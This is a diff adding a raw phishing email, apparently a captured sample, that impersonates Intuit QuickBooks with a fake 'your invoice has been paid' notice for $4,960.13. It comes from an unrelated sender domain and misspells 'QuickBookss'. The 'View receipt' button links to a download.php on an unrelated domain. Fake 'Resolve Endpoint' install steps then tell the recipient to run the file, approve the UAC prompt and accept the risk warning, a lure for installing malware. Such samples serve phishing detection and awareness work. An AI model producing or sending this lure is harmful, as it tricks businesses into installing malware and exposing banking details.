@@ -1,0 +1,166 @@
+Return-Path: <email@securemail.net>
+Received: from [185.154.75.184] ([185.154.75.184])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id ercliq9fqt03mafhfmab34gckl2djgvvqumj23o1
+ for zingerpie@kfcreview.com;
+ Sun, 01 Nov 2026 07:16:09 +0000 (UTC)
+Received-SPF: permerror (spfCheck: Error in processing SPF Record) client-ip=185.154.75.184; envelope-from=email@securemail.net; helo=[185.154.75.184];
+Authentication-Results: amazonses.com;
+ spf=permerror (spfCheck: Error in processing SPF Record) client-ip=185.154.75.184; envelope-from=email@securemail.net; helo=[185.154.75.184];
+ dmarc=none header.from=securemail.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFFRVkwRGsyNDVNWk4rRnBKUU9kMkIxQ3Jmd2hhSDlhRENPU0RPR0p4SFkza3hWRWRGd0hXeldlblUzOTIzV1hVRVVSc3l4UVBudXpHdkhYOEw4dXcySEZzNjhPbDdHN0FmWkhCMi9HWlFWaHorM29CeERreHAra1N2N0JjaTV3TlJoaEk5WGdmZktmSGZVN1NrTUR5b0RiY3h6RS9Id0hYVFVMNTJaTHl6cWRwNzgvVmI4ZWpkQU9kNzdOYUtmN3dNNGl5R3VvbmIzQTkwZUZVQU9hNkd5YTVWYnBrTnB4R2NsTi9SY0MrUUc2dXh3a3pTaWFxdzMyaDVaQkJnalUvZytpRGFCVkVnOGVybGdBNmIrK0ZaOE5LY2k0YktRU25jOVIyd1V1SE9HWWN6TlhYemNDdUlJTmowZXlOSVVGWkU9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=J1YYHNVm/1suI8FA/D4x9ymmTrihjNveYYbIrKYphS0KhUW4ZcnEZFzB8QYKa2mNA8d7K2BcyO8geiVjg+KDCyGa35lMBc59u85m++obv3tzNFl8hNC3TEtd4UxU4tH0ZwMaJFEESDJOS662wHhtdQ4HBaYa9B3mQOVjC900GdU=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1793517370; v=1; bh=pnHMOfOvmo+qZakfyN1gEdI9XcUotJRfP5gplvXWdB0=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: Intuit QuickBooks <email@securemail.net>
+To: zingerpie@kfcreview.com
+Subject: Your paid invoice is on the way!
+Date: 1 Nov 2026 10:16:09 +0300
+Message-ID: <20261101101608.C75FC384DADB2DDC@securemail.net>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html>
+<html lang=3D"en">
+<head>
+  <meta charset=3D"UTF-8">
+  <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
+1.0">
+  <title>Invoice Payment Confirmation</title>
+</head>
+<body>
+<div id=3D"editbody1" style=3D"margin: 0; padding: 0; background-color: #f4=
+f4f4; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;">
+  <table style=3D"background-color: #f4f4f4;" border=3D"0" width=3D"100%" c=
+ellspacing=3D"0" cellpadding=3D"0">
+    <tbody>
+      <tr>
+        <td style=3D"padding: 24px 16px;" align=3D"center">
+          <table style=3D"background-color: #ffffff; border-radius: 8px; ov=
+erflow: hidden; max-width: 600px; width: 100%;" border=3D"0" width=3D"600" =
+cellspacing=3D"0" cellpadding=3D"0">
+            <tbody>
+
+              <!-- Intuit QuickBookss Logo -->
+              <tr>
+                <td style=3D"padding: 32px 32px 24px; text-align: left;">
+                  <img
+                    src=3D"https://mms.businesswire.com/media/2023121498607=
+6/en/1829358/5/Intuit_Logo_2023.jpg?download=3D1"
+                    alt=3D"Intuit QuickBookss"
+                    width=3D"160"
+                    style=3D"display: block; width: 160px; max-width: 100%;=
+ height: auto; border: 0;"
+                  >
+                </td>
+              </tr>
+
+              <!-- Invoice Heading -->
+              <tr>
+                <td style=3D"padding: 0 32px 24px;">
+                  <h1 style=3D"margin: 0; font-size: 24px; line-height: 1.3=
+; color: #393a3d;">
+                    Your invoice has been paid
+                  </h1>
+                  <p style=3D"margin: 8px 0 0; font-size: 15px; color: #6b6=
+c72;">
+                    Invoice #INV-freight-027
+                  </p>
+                </td>
+              </tr>
+
+              <!-- Amount Paid -->
+              <tr>
+                <td style=3D"padding: 0 32px 24px;">
+                  <p style=3D"margin: 0; font-size: 13px; color: #6b6c72;">=
+
+                    Amount paid
+                  </p>
+                  <p style=3D"margin: 4px 0 0; font-size: 24px; font-weight=
+: bold; color: #2ca01c;">
+                    $4,960.13
+                  </p>
+                </td>
+              </tr>
+
+              <!-- Receipt Button -->
+              <tr>
+                <td style=3D"padding: 0 32px 24px;">
+                  <a
+                    style=3D"display: inline-block; padding: 14px 28px; bac=
+kground-color: #2ca01c; color: #ffffff; text-decoration: none; border-radiu=
+s: 4px; font-size: 16px; font-weight: bold;"
+                    href=3D"https://go.ohiocommunitycolleges.com/proj/sc/in=
+tuit/download.php"
+                    target=3D"_blank"
+                    rel=3D"noopener noreferrer"
+                  >View receipt</a>
+                </td>
+              </tr>
+
+              <!-- Invoice Information -->
+              <tr>
+                <td style=3D"padding: 0 32px 32px;">
+                  <p style=3D"margin: 0; font-size: 14px; line-height: 1.5;=
+ color: #6b6c72;">
+                    You can now view paid invoice, update your billing deta=
+ils, confirm your bank information,=20
+					or monitor Payroll in QuickBooks Resolve Endpoint.
+                  </p>
+                </td>
+              </tr>
+
+              <!-- Connect Key -->
+              <tr>
+                <td style=3D"padding: 0 32px 32px;">
+                  <p style=3D"margin: 0 0 8px; font-size: 14px; font-weight=
+: bold; color: #393a3d;">
+                    QuickBooks Resolve Endpoint Installation Guide
+                  </p>
+
+                  <table border=3D"0" width=3D"100%" cellspacing=3D"0" cell=
+padding=3D"0">
+                    <tbody>
+                      <tr>
+                        <td style=3D"background-color: #e3e4e6; border-radi=
+us: 6px; padding: 16px; font-family: monospace; font-size: 10px; color: #39=
+3a3d; word-break: break-all;">
+                          <strong>Step 1. Double-click on the downloaded fi=
+le<br>
+						  Step 2. Click 'Yes' at the UAC prompt<br>
+						  Step 3. Check the box 'I understand the risk'<br>
+						  Step 4. Then click 'OK' to finish installation</strong>
+                        </td>
+                      </tr>
+                    </tbody>
+                  </table>
+
+                  <p style=3D"margin: 8px 0 0; font-size: 12px; color: #6b6=
+c72;">
+                    Please follow the process above for successful installa=
+tion.
+                  </p>
+                </td>
+              </tr>
+
+              <!-- Footer -->
+              <tr>
+                <td style=3D"padding: 0 32px 32px;">
+                  <p style=3D"margin: 0; font-size: 12px; color: #6b6c72;">=
+
+                    <strong>Paid via QuickBookss Intuit</strong><br>
+					You're receiving this email because you have a QuickBooks account.<br>=
+
+					=A9 2026 Intuit Inc
+                  </p>
+                </td>
+              </tr>
+
+            </tbody>
+          </table>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+</body>
+</html>
